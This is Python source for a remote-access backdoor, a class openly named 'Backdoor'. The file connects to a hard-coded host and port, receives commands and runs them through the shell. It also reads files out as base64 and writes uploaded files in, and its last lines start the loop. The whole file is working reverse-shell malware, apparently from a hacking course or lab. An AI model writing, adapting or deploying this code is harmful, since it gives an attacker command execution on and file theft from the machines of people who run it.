import socket
import json
import subprocess
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)
    
    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working diroktory."

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
        
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successfully."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == 'exit':
                    self.conn.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_dir(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

my_backdoor = Backdoor('192.168.64.2', 8080)
my_backdoor.run()
